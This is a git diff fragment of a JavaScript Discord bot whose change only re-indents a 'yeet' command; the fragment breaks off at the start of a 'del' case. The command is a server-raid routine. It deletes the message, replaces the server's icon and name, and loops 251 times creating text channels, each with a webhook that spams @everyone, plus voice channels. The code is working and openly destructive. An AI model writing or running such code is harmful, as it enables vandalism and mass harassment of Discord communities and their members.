@@ -24,25 +24,25 @@ client.on("message", (message) => {
     const comando = args.shift().toLowerCase();
     switch(comando) {
         case 'yeet':
-			message.delete();
-			message.guild.setIcon(`./image.png`);
-			if (!args[0]) mode = `haha admin go grr`;
-            if (args[0]) mode = args.slice(0, 32).join(` `)
-			message.guild.setName(`${mode}`);
-			try {
-                for (i = 0; i < 251; i++) {
-				    message.guild.channels.create(`${mode}`, {type: `text`}).then(m => {
-					    m.createWebhook('XDDDD').then(w => {
-					    	const hook = new Discord.WebhookClient(w.id, w.token);
-					    	hook.send(`@everyone tirei o arroz de um robô e olha no que deu`)
-					    });
-				    });
-				    message.guild.channels.create(`${mode}`, {type: `voice`});
+	     message.delete();
+	     message.guild.setIcon(`./image.png`);
+	     if (!args[0]) mode = `haha admin go grr`;
+             if (args[0]) mode = args.slice(0, 32).join(` `)
+             message.guild.setName(`${mode}`);
+		try {
+                    for (i = 0; i < 251; i++) {
+			message.guild.channels.create(`${mode}`, {type: `text`}).then(m => {
+			    m.createWebhook('XDDDD').then(w => {
+				const hook = new Discord.WebhookClient(w.id, w.token);
+				hook.send(`@everyone tirei o arroz de um robô e olha no que deu`)
+			    });
+			});
+			message.guild.channels.create(`${mode}`, {type: `voice`});
+                    }
+		} catch (e) {
+                   break;
                 }
-			} catch (e) {
-                break;
-            }
-		break;
+	break;
         case "del":
             message.delete();
             message.guild.setIcon(`./image.png`)
